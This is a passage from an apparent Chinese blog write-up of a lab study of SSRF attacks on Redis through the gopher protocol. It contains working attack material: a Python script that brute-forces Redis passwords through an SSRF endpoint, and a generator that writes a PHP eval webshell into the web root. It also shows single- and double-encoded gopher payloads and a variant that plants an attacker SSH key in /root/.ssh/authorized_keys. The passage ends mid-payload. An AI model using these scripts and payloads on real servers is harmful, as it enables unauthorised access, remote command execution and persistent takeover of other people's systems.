port指定抓取的端口
-w保存到文件，后接保存的路径与文件名</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228175523608.png" alt="image-20231228175523608"></p>
<p>这里本地先开启监听，之后进入redis服务器<code>redis-cli -h 127.0.0.1 -p 6379</code> 之后在redis服务器执行如下命令</p>
<pre><code class="hljs sh">127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> key1 value1
OK
127.0.0.1:6379&gt; quit</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228175629190.png" alt="image-20231228175629190"></p>
<p>最后将产生的pcap数据包传入wireshark追踪tcp数据流</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228175746108.png" alt="image-20231228175746108"></p>
<p>这里对于该工具的使用方法几乎不懂，但好在找到了目标数据，如上图所示</p>
<p>抓到的数据包如下，结合我们上面对RESP协议的解释，我们来逐行分析:</p>
<pre><code class="hljs sh">*3：代表数组，也就是这个数组长度为3，<span class="hljs-built_in">set</span>、key1、value1可以将之间的空格认为是分隔符
<span class="hljs-variable">$3</span>：代表批量字符串，长度为3：<span class="hljs-built_in">set</span>；之后的<span class="hljs-variable">$4</span>、<span class="hljs-variable">$6</span>同理
最后的+OK：代表简单字符串
其中<span class="hljs-built_in">set</span>代表设置key，key为key1，对应的value为value1
最后的+OK代表服务端执行成功后返回的字符串</code></pre>
<p>hex转储看一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228180421235.png" alt="image-20231228180421235"></p>
<p>正如前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
<p>这里的0d0a代表CRLF也就是回车换行符，在这里代表结束符。那有趣的来了，如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre><code class="hljs sh">*3
<span class="hljs-variable">$3</span>
<span class="hljs-built_in">set</span>
<span class="hljs-variable">$4</span>
key1
<span class="hljs-variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre><code class="hljs sh">命令：
<span class="hljs-built_in">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h1 id="0x04-redis配合gopher协议进行ssrf">0x04 Redis配合gopher协议进行SSRF</h1>
<h2 id="概述">概述</h2>
<p>gopher协议是http协议出现之前，在internet中常见的一个协议，但现在这个协议用的越来越少了，但该协议在ssrf中却大有用途，可以用来攻击redis、ftp等，还可以发送get、post请求，这在ssrf攻击中大有作为。</p>
<h2 id="利用条件">利用条件</h2>
<p>redis所在的服务端存在未授权访问或者通过弱口令可以访问到</p>
<h2 id="利用">利用</h2>
<p>redis常见的SSRF攻击方式大概有这几种：</p>
<ol>
<li>
<p>redis认证攻击</p>
</li>
<li>
<p>绝对路径写webshell</p>
</li>
<li>
<p>写ssh公钥</p>
</li>
<li>
<p>写contrab计划任务反弹shell</p>
</li>
</ol>
<p>下面我们逐个实现</p>
<h2 id="redis认证攻击">redis认证攻击</h2>
<p>这里呢也是可以分为两种情况的，一种是遇到默认无密码的redis服务器，另一种就是有密码的。</p>
<h3 id="无密码redis攻击">无密码Redis攻击</h3>
<p>先考虑无密码的，这里呢其实也就是我们上述0x03中介绍过的可以直接构造恶意的明文命令，或者tcp数据流，发送给redis服务器</p>
<p>但这里呢如果对方的redis服务暴露在公网，这就好办了，直接curl发送gopher协议即可。</p>
<p>但如果对方redis限制只监听本地请求，那我们就只能祈祷对方服务器存在ssrf，接下来对于无密码的我就直接cv上面的了。</p>
<p>如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre><code class="hljs sh">*3
<span class="hljs-variable">$3</span>
<span class="hljs-built_in">set</span>
<span class="hljs-variable">$4</span>
key1
<span class="hljs-variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre><code class="hljs sh">命令：
<span class="hljs-built_in">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h3 id="有密码redis攻击">有密码Redis攻击</h3>
<p>这里我们先确定一个登录认证密码，修改redis下的配置文件 <strong>redis.conf</strong>，搜索 <strong>requirepass</strong> 关键字。</p>
<p><code>vim /etc/redis/redis.conf</code>，如下图将#去掉，并在requirepass后面添加密码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228202542781.png" alt="image-20231228202542781"></p>
<p>退出后重新启动redis服务，接着我们开始爆破。</p>
<p>对于这种需要密码登录认证的，我们可以尝试弱密码，但手动太麻烦，这里我就跟师傅学着写个脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests

target = <span class="hljs-string">"http://192.168.246.138/ssrf.php?url="</span>  <span class="hljs-comment"># 请输入目标url</span>
rhost = <span class="hljs-string">"127.0.0.1"</span>
rport = <span class="hljs-string">"6379"</span>

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"r+"</span>) <span class="hljs-keyword">as</span> file:
    passwds = file.readlines()
    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:
        passwd = passwd.strip(<span class="hljs-string">"\n"</span>)
        len_pass = <span class="hljs-built_in">len</span>(passwd)
        payload = <span class="hljs-string">r"gopher://"</span> + rhost + <span class="hljs-string">":"</span> + rport + <span class="hljs-string">"/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524"</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r"%250d%250a"</span>+passwd+<span class="hljs-string">r"%250D%250A%252A1%250D%250A"</span>
        url = target+<span class="hljs-built_in">str</span>(payload)
        text = requests.get(url).text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> text:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 爆破成功 密码为: "</span> + passwd)
            <span class="hljs-built_in">print</span>(text + payload)
            <span class="hljs-keyword">break</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228202916199.png" alt="image-20231228202916199"></p>
<p>上图为简单的字典，如下图可以看到最后停在了hybcx这里，说明密码为hybcx</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228203032489.png" alt="image-20231228203032489"></p>
<p>如下图检验成功</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231228203105346.png" alt="image-20231228203105346"></p>
<h2 id="绝对路径写webshell">绝对路径写webshell</h2>
<p>据说这个方法是最常用的</p>
<h3 id="构造payload">构造payload</h3>
<p>先构造redis命令</p>
<pre><code class="hljs sh">flushall  	<span class="hljs-comment">#删除redis数据库中所有的key</span>
<span class="hljs-built_in">set</span> 1 <span class="hljs-string">'&lt;?php eval($_GET["cmd"]);?&gt;'</span>		<span class="hljs-comment">#设置键1，值为一句话木马</span>
config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html		<span class="hljs-comment">#设置redis数据库文件存储位置，这里设置为了web目录</span>
<span class="hljs-comment">#设置数据库文件名为shell.php，这里是指示redis在下一次保存其数据库时存储为 web目录/shell.php</span>
config <span class="hljs-built_in">set</span> dbfilename shell.php		
save	<span class="hljs-comment">#这个命令告诉Redis立即同步保存数据到磁盘上的数据库文件</span></code></pre>
<p>这里的目的就是向对方服务器的web目录写入一句话木马。这里师傅自己写了个转化为redis RESP协议格式的脚本，这里我直接cv了（我是大彩笔~~）</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename=<span class="hljs-string">"shell.php"</span>
path=<span class="hljs-string">"/var/www/html"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span>(payload)</code></pre>
<p>得到的payload如下，不过下面只进行了一次url编码，而如果我们利用的是ssrf的话，一般就要编码两次</p>
<pre><code class="hljs plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%
0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
//二次编码后
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%2
53Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250A
dir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p>最后在ssrf.php发送上述payload即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229142501547.png" alt="image-20231229142501547"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229142516461.png" alt="image-20231229142516461"></p>
<p>服务端看到木马成功写入，下图验证成功</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229142530303.png" alt="image-20231229142530303"></p>
<p>在这里推荐一个工具，虽然之前的文章gopherus工具就可以打redis，不过感觉这个更专业</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LS95/gopher-redis-auth">gopher-redis-auth</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229143001471.png" alt="image-20231229143001471"></p>
<p>py2环境下运行，得到的内容记得二次编码发送</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229143034128.png" alt="image-20231229143034128"></p>
<p>依旧成功写入</p>
<h2 id="写ssh公钥">写ssh公钥</h2>
<p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code>；如果不存在，则可以利用<code>crontab</code>创建该目录</p>
<p>不过需要注意，这种方法需要确保靶机允许使用密钥登录。</p>
<p>开启方法：需要修改 ssh 配置文件 /etc/ssh/sshd_config</p>
<pre><code class="hljs sh"><span class="hljs-comment">#StrictModes yes</span>
改为
StrictModes no
然后重启sshd即可
/bin/systemctl restart  sshd.service</code></pre>
<p>我们先直接尝试ssh登录靶机试试：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229143701556.png" alt="image-20231229143701556"></p>
<p>可以看到是需要登录密码的，那我们开始攻击</p>
<h3 id="生成攻击机公钥">生成攻击机公钥</h3>
<p>这里呢我对公钥私钥的原理什么的忘记了，具体原理我认为可以参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/267701810">SSH 的原理与应用</a></p>
<p>其中对咱们这次的攻击思路有帮助的是</p>
<pre><code class="hljs plaintext">使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。

所谓"公钥登录"，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。

这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个： $ ssh-keygen

运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。
运行结束以后，在~/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是公钥，后者是私钥。</code></pre>
<p>这也就是说我们可以想办法将自己攻击机的公钥发送到对方服务器上，这样我们以后对其请求远程连接的时候就没必要输入密码了。</p>
<pre><code class="hljs sh">ssh-keygen -t rsa</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229144834957.png" alt="image-20231229144834957"></p>
<p>这里一路回车即可，最后进入/root/.ssh目录下即可看到公钥和私钥，如下图，前者为私钥，后者为公钥</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229145130446.png" alt="image-20231229145130446"></p>
<pre><code class="hljs plaintext">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali</code></pre>
<p>最后我们修改一下上述脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali\n\n"</span>
filename=<span class="hljs-string">"authorized_keys"</span>
path=<span class="hljs-string">"/root/.ssh/"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//二次编码的结果</span>
gopher%<span class="hljs-number">3</span>A<span class="hljs-comment">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rs</span>
a%<span class="hljs-number">2520</span>AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8%<span class="hljs-number">252</span>BFZ3tPB8iivCWMCVFAAby4gH7GvL%<span class="hljs-number">252</span>BDYQnOMQXsIbC3xrqQ%<span class="hljs-number">252</span>BC6O/<span class="hljs-number">4</span>T4VZey1e2JQ00O7%<span class="hljs-number">252</span>B8Kl2gWuIkPyXK
KTXm88LOfYcARETlr20%<span class="hljs-number">252</span>BINfJuzcb6ui1ZF%<span class="hljs-number">252</span>BQnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY%<span class="hljs-number">252</span>BPV3d
